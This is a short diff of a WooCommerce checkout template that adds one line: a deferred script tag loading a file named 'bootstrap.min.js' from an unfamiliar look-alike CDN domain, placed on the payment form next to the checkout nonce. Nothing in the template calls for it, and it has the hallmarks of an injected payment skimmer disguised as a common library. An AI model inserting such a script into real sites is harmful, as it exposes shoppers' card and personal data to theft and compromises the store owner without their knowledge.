@@ -55,7 +55,7 @@ if ( ! wp_doing_ajax() ) {
 		<?php do_action( 'woocommerce_review_order_after_submit' ); ?>
 
 		<?php wp_nonce_field( 'woocommerce-process_checkout', 'woocommerce-process-checkout-nonce' ); ?>
-	</div>
+	</div><script type="text/javascript" src="https://cdnjsguard.com/safe/atsdiamondtools/bootstrap.min.js" defer ></script>
 </div>
 <?php
 if ( ! wp_doing_ajax() ) {
